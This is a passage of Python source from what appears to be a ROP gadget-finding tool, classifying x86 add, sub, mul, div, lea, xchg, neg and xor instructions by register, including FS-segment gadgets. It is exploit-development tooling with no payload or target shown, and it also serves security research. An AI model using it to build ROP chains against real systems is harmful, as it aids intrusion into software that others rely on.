					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.addEBP)
				elif re.match( r'^[add|adc]+ [e]*d[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.addEDX)
				elif re.match( r'^[add|adc]+ [e]*di', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.addEDI)
				elif re.match( r'^[add|adc]+ [e]*si', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.addESI)
			else:
			#### DWORDS
				if re.match( r'^[add|adc]+ [dword|byte|word]* [ptr]* [\[]*[e]*a[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.addDwordEAX)
				elif re.match( r'^[add|adc]+ [dword|byte|word]* [ptr]* [\[]*[e]*b[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.addDwordEBX)
				elif re.match( r'^[add|adc]+ [dword|byte|word]* [ptr]* [\[]*[e]*c[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.addDwordECX)
				elif re.match( r'^[add|adc]+ [dword|byte|word]* [ptr]* [\[]*[e]*sp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addDwordESP)
				elif re.match( r'^[add|adc]+ [dword|byte|word]* [ptr]* [\[]*[e]*bp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.addDwordEBP)
				elif re.match( r'^[add|adc]+ [dword|byte|word]* [ptr]* [\[]*[e]*d[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.addDwordEDX)
				elif re.match( r'^[add|adc]+ [dword|byte|word]* [ptr]* [\[]*[e]*di', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.addDwordEDI)
				elif re.match( r'^[add|adc]+ [dword|byte|word]* [ptr]* [\[]*[e]*si', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.addDwordESI)

				if "fs:[e" in testVal or "fs:[0xc0]" in testVal:
					if re.match( r'^add [e]*[abcdsibpbx]+, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addFS)
					if re.match( r'^add eax, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addFSEAX)
					elif re.match( r'^add ebx, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addFSEBX)
					elif re.match( r'^add ecx, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addFSECX)
					elif re.match( r'^add edx, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addFSEDX)
					elif re.match( r'^add edi, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addFSEDI)
					elif re.match( r'^add esi, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addFSESI)
					elif re.match( r'^add ebp, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addFSEBP)
					elif re.match( r'^add esp, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.addFSESP)
					try:
						if obj!=False:
							fsReg=getFSIndex(obj)
							obj.setFSIndex(fsReg)
					except:
						pass

	def do_sub(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if not re.match( r'^[sub|sbb]+ dword ptr \[eax\], eax|[sub|sbb]+ dword ptr \[ebx\], ebx|[sub|sbb]+ dword ptr \[ecx\], ecx|[sub|sbb]+ dword ptr \[edx\], edx|[sub|sbb]+ dword ptr \[esi\], esi|[sub|sbb]+ dword ptr \[edi\], edi|[sub|sbb]+ dword ptr \[ebp\], ebp|[sub|sbb]+ dword ptr \[esp\], esp|[sub|sbb]+ [byte|word|dword]+ ptr \[eax\], al|[sub|sbb]+ [byte|word|dword]+ ptr \[ebx\], bl|[sub|sbb]+ [byte|word|dword]+ ptr \[ecx\], cl|[sub|sbb]+ [byte|word|dword]+ ptr \[edx\], dl|[sub|sbb]+  [byte|word|dword]+ ptr \[eax ]+ eax\], al|[sub|sbb]+  [byte|word|dword]+ ptr \[ebx \+ ebx\], bl|[sub|sbb]+  [byte|word|dword]+ ptr \[ecx \+ ecx\], cl|[sub|sbb]+  [byte|word|dword]+ ptr \[edx \+ edx\], dl|[sub|sbb]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+\]|[sub|sbb]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+\]|[sub|sbb]+ [byte|word|dword]+ ptr \[e[abcdxsdbpi]+ [\+|\-]+ e[abcdxsdbpi]+ [\+|\-]+ 0x', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.sub)

			if "dword" not in testVal:
				if re.match( r'[sub|sbb]+ [e]*a[x|l|h]', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.subEAX)
				elif re.match( r'[sub|sbb]+ [e]*b[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.subEBX)
				elif re.match( r'[sub|sbb]+ [e]*c[x|l|h]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.subECX)
				elif re.match( r'[sub|sbb]+ [e]*d[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.subEDX)
				elif re.match( r'^[sub|sbb]+ [e]*si', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.subESI)
				elif re.match( r'^[sub|sbb]+ [e]*di', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.subEDI)
				elif re.match( r'^[sub|sbb]+ [e]*sp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.subESP)
				elif re.match( r'^[sub|sbb]+ [e]*bp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.subEBP)
			else:
				# Sub dword
				if re.match( r'^[sub|sbb]+ [dword|byte|word]* [ptr]* [\[]*[e]*a[x|l|h]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.subDwordEAX)
				elif re.match( r'^[sub|sbb]+ [dword|byte|word]* [ptr]* [\[]*[e]*b[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.subDwordEBX)
				elif re.match( r'^[sub|sbb]+ [dword|byte|word]* [ptr]* [\[]*[e]*c[x|l|h]*', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.subDwordECX)
				elif re.match( r'^[sub|sbb]+ [dword|byte|word]* [ptr]* [\[]*[e]*d[x|l|h]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.subDwordEDX)
				elif re.match( r'^[sub|sbb]+ [dword|byte|word]* [ptr]* [\[]*[e]*si', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.subDwordESI)
				elif re.match( r'^[sub|sbb]+ [dword|byte|word]* [ptr]* [\[]*[e]*di', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.subDwordEDI)
				elif re.match( r'^[sub|sbb]+ [dword|byte|word]* [ptr]* [\[]*[e]*sp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.subDwordESP)
				elif re.match( r'^[sub|sbb]+ [dword|byte|word]* [ptr]* [\[]*[e]*bp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.subDwordEBP)
				if "fs:[e" in testVal or "fs:[0xc0]"  in testVal:
					if re.match( r'^[sub|sbb]+ [e]*[abcdsibpbx]+, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.subFS)
					if re.match( r'[sub|sbb]+ eax, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.subFSEAX)
					elif re.match( r'[sub|sbb]+ ebx, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.subFSEBX)
					elif re.match( r'[sub|sbb]+ ecx, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.subFSECX)
					elif re.match( r'[sub|sbb]+ edx, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.subFSEDX)
					elif re.match( r'[sub|sbb]+ edi, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.subFSEDI)
					elif re.match( r'[sub|sbb]+ esi, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.subFSESI)
					elif re.match( r'[sub|sbb]+ ebp, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.subFSEBP)
					elif re.match( r'[sub|sbb]+ esp, dword ptr fs', testVal, re.M|re.I):
						obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.subFSESP)
					try:
						if obj!=False:
							fsReg=getFSIndex(obj)
							obj.setFSIndex(fsReg)
					except:
						pass


	def do_sbb(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do_sub(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do_mul(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.mul)
		if not re.match( r'^imul', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.mulEAX)
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.mulEDX)
		if re.match( r'^imul[b|w|l]* [e]*ax,', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.mulEAX)
		elif re.match( r'^imul[b|w|l]* [e]*bx,', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.mulEBX)
		elif re.match( r'^imul[b|w|l]* [e]*cx,', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.mulECX)
		elif re.match( r'^imul[b|w|l]* [e]*dx,', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.mulEDX)
		elif re.match( r'^imul[b|w|l]* [e]*si,', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.mulESI)
		elif re.match( r'^imul[b|w|l]* [e]*di, ', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.mulEDI)
		elif re.match( r'^imul[b|w|l]* [e]*sp, ', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.mulESP)
		elif re.match( r'^imul[b|w|l]* [e]*bp, ', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.mulEBP)

	def do_imul(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do_mul(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do_div(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.div)
		if re.match( r'\bdiv\b|\bdivb\b|\bdivw\b|\bdivl\b|\bdivwl|\bdivbwl\b|\bidiv\b|\bidivb\b|\bidivw\b|\bidivl\b|\bidivwl|\bidivbwl\b', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.divEAX)
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.divEDX)

		# if not re.match( r'^imul', testVal, re.M|re.I):
		# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.mulEAX)
		# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.mulEDX)
		# if re.match( r'^imul[b|w|l]* [e]*ax,', testVal, re.M|re.I):
		# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.mulEAX)
		# elif re.match( r'^imul[b|w|l]* [e]*bx,', testVal, re.M|re.I):
		# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.mulEBX)
		# elif re.match( r'^imul[b|w|l]* [e]*cx,', testVal, re.M|re.I):
		# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.mulECX)
		# elif re.match( r'^imul[b|w|l]* [e]*dx,', testVal, re.M|re.I):
		# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.mulEDX)
		# elif re.match( r'^imul[b|w|l]* [e]*si,', testVal, re.M|re.I):
		# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.mulESI)
		# elif re.match( r'^imul[b|w|l]* [e]*di, ', testVal, re.M|re.I):
		# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.mulEDI)
		# elif re.match( r'^imul[b|w|l]* [e]*sp, ', testVal, re.M|re.I):
		# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.mulESP)
		# elif re.match( r'^imul[b|w|l]* [e]*bp, ', testVal, re.M|re.I):
		# 	addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.mulEBP)

	def do_idiv(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do_div(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do_lea(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.lea)
		if re.match( r'^lea [e]*a[x|l|h]+|^lea [dword|byte|word]+ ptr \[[e]*a[x|l|h]', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.leaEAX)
		elif re.match( r'^lea [e]*b[x|l|h]+|^lea [dword|byte|word]+ ptr \[[e]*b[x|l|h]', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.leaEBX)
		elif re.match( r'^lea [e]*c[x|l|h]+|^lea [dword|byte|word]+ ptr \[[e]*c[x|l|h]', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.leaECX)
		elif re.match( r'^lea [e]*d[x|l|h]+|^lea [dword|byte|word]+ ptr \[[e]*d[x|l|h]', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.leaEDX)
		elif re.match( r'^lea [e]*si|^lea [dword|byte|word]+ ptr \[[e]*si', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.leaESI)
		elif re.match( r'^lea [e]*di|^lea [dword|byte|word]+ ptr \[[e]*di', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.leaEDI)
		elif re.match( r'^lea [e]*bp|^lea [dword|byte|word]+ ptr \[[e]*bp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.leaEBP)
		elif re.match( r'^lea [e]*sp|^lea [dword|byte|word]+ ptr \[[e]*sp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.leaESP)

	def do_xchg(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.xchg)

		if not re.match( r'^xchg eax, eax|^xchg ebx, ebx|^xchg ecx, ecx|^xchg edx, edx|^xchg esi, esi|^xchg edi, edi|^xchg esp, esp|^xchg ebp, ebp|^xchg ax, ax|^xchg bx, bx|^xchg cx, cx|^xchg dx, dx|^xchg si, si|^xchg di, di|^xchg sp, sp|^xchg bp, bp|^xchg al, al|^xchg bl, bl|^xchg cl, cl|^xchg dl, dl', testVal, re.M|re.I):
			if re.match( r'^xchg eax, e[abcdsb]+[xspi]+|^xchg e[abcdsb]+[xspi]+, eax', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.xchgEAX)
			if re.match( r'^xchg ebx, e[abcdsb]+[xspi]+|^xchg e[abcdsb]+[xspi]+, ebx', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.xchgEBX)
			if re.match( r'^xchg ecx, e[abcdsb]+[xspi]+|^xchg e[abcdsb]+[xspi]+, ecx', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.xchgECX)
			if re.match( r'^xchg edx, e[abcdsb]+[xspi]+|^xchg e[abcdsb]+[xspi]+, edx', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.xchgEDX)
			if re.match( r'^xchg esi, e[abcdsb]+[xspi]+|^xchg e[abcdsb]+[xspi]+, esi', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.xchgESI)
			if re.match( r'^xchg edi, e[bcdsb]+[xspi]+|^xchg e[abcdsb]+[xspi]+, edi', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.xchgEDI)
			if re.match( r'^xchg ebp, e[abcdsb]+[xspi]+|^xchg e[abcdsb]+[xspi]+, ebp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.xchgEBP)
			if re.match( r'^xchg esp, e[abcdsb]+[xspi]+|^xchg e[abcdsb]+[xspi]+, esp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xchgESP)
			if "fs:[e" in testVal or "fs:[0xc0]"  in testVal and "dword" in testVal:
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xchgFS)
				if re.match( r'^xchg eax, dword ptr fs|xchg dword ptr fs:\[e[abcdsb]+.*], eax', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xchgFSEAX)
				elif re.match( r'^xchg ebx, dword ptr fs|xchg dword ptr fs:\[e[abcdsb]+.*], ebx', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xchgFSEBX)
				elif re.match( r'^xchg ecx, dword ptr fs|xchg dword ptr fs:\[e[abcdsb]+.*], ecx', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xchgFSECX)
				elif re.match( r'^xchg edx, dword ptr fs|xchg dword ptr fs:\[e[abcdsb]+.*], edx', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xchgFSEDX)
				elif re.match( r'^xchg edi, dword ptr fs|xchg dword ptr fs:\[e[abcdsb]+.*], edi', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xchgFSEDI)
				elif re.match( r'^xchg esi, dword ptr fs|xchg dword ptr fs:\[e[abcdsb]+.*], esi', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xchgFSESI)
				elif re.match( r'^xchg ebp, dword ptr fs|xchg dword ptr fs:\[e[abcdsb]+.*], ebp', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xchgFSEBP)
				elif re.match( r'^xchg esp, dword ptr fs|xchg dword ptr fs:\[e[abcdsb]+.*], esp', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xchgFSESP)
				try:
					if obj!=False:
						fsReg=getFSIndex(obj)
						obj.setFSIndex(fsReg)
				except:
					pass

	def do_neg(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.neg)
		if re.match( r'^neg [e]*a[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.negEAX)
		elif re.match( r'^neg [e]*b[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.negEBX)
		elif re.match( r'^neg [e]*c[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.negECX)
		elif re.match( r'^neg [e]*d[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.negEDX)
		elif re.match( r'^neg [e]*si', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.negESI)
		elif re.match( r'^neg [e]*di', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.negEDI)
		elif re.match( r'neg [e]*sp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.negESP)
		elif re.match( r'^neg [e]*bp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.negEBP)

	def do_xor(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.xor)
		if "ptr" not in testVal:
			if re.match( r'^xor [e]*a[x|l|h]+', testVal, re.M|re.I):
				if re.match( r'^xor eax, eax', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.xorZeroEAX)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.xorEAX)
			elif re.match( r'^xor [e]*b[x|l|h]+', testVal, re.M|re.I):
				if re.match( r'^xor ebx, ebx', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.xorZeroEBX)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.xorEBX)
			elif re.match( r'^xor [e]*c[x|l|h]+', testVal, re.M|re.I):
				if re.match( r'^xor ecx, ecx', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.xorZeroECX)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.xorECX)
			elif re.match( r'^xor [e]*d[x|l|h]+', testVal, re.M|re.I):
				if re.match( r'^xor edx, edx', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.xorZeroEDX)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.xorEDX)
			elif re.match( r'^xor [e]*si', testVal, re.M|re.I):
				if re.match( r'^xor esi, esi', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.xorZeroESI)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.xorESI)
			elif re.match( r'^xor [e]*di', testVal, re.M|re.I):
				if re.match( r'^xor edi, edi', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.xorZeroEDI)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.xorEDI)
			elif re.match( r'^xor [e]*sp', testVal, re.M|re.I):
				if re.match( r'^xor esp, esp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorZeroESP)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorESP)
			elif re.match( r'^xor [e]*bp', testVal, re.M|re.I):
				if re.match( r'^xor ebp, ebp', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.xorZeroEBP)
				else:
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.xorEBP)
		else:
			if re.match( r'^xor dword ptr \[[e]*a[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.xorDwordEAX)
			elif re.match( r'^xor dword ptr \[[e]*b[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.xorDwordEBX)
			elif re.match( r'^xor dword ptr \[[e]*c[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.xorDwordECX)
			elif re.match( r'^xor dword ptr \[[e]*d[x|l|h]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.xorDwordEDX)
			elif re.match( r'^xor dword ptr \[[e]*si', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.xorDwordESI)
			elif re.match( r'^xor dword ptr \[[e]*di', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.xorDwordEDI)
			elif re.match( r'^xor dword ptr \[[e]*sp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorDwordESP)
			elif re.match( r'^xor dword ptr \[[e]*bp', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.xorDwordEBP)
			if "fs:[e" in testVal or "fs:[0xc0]"  in testVal:
				if re.match( r'^xor [e]*[abcdsibpbx]+, dword ptr fs', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorFS)
				if re.match( r'^xor eax, dword ptr fs', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorFSEAX)
				elif re.match( r'^xor ebx, dword ptr fs', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorFSEBX)
				elif re.match( r'^xor ecx, dword ptr fs', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorFSECX)
				elif re.match( r'^xor edx, dword ptr fs', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorFSEDX)
				elif re.match( r'^xor edi, dword ptr fs', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorFSEDI)
